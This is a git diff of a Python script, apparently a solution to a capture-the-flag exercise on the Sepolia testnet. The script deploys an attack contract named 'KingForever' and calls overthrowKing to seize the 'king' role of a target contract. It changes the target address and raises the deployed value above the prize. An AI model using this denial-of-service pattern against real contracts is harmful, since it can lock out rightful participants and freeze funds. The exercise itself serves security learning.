@@ -2,8 +2,8 @@
 from ape import accounts, convert, project
 from rich.console import Console
 
-# sepolia: 0x902f8598266c868802A980cd7A2d6ffc175275a7
-ADDRESS = "0x902f8598266c868802A980cd7A2d6ffc175275a7"
+# sepolia: 0xe5Ed7BadFcf62B57D3dAC74F8Be5BF9213977Fe2
+ADDRESS = "0xe5Ed7BadFcf62B57D3dAC74F8Be5BF9213977Fe2"
 
 console = Console()
 
@@ -17,11 +17,9 @@ def attack():
     console.print("[red]Attacking Now...")
     
     prize_value = target_contract.prize()
-    attacking_contract = project.KingForever.deploy(value=prize_value, sender=attacker)
+    attacking_contract = project.KingForever.deploy(value=prize_value + convert("0.0001 ETH", int), sender=attacker)
+    attacking_contract.overthrowKing(ADDRESS, sender=attacker)
 
-    attacking_contract.overthrowKing(target_contract.address, sender=attacker)
-
-    # assert target_contract._king() == attacker.address
     console.print(f"[green]King After The Hack: [magenta]{target_contract._king()}")
 
     prize_value = target_contract.prize()
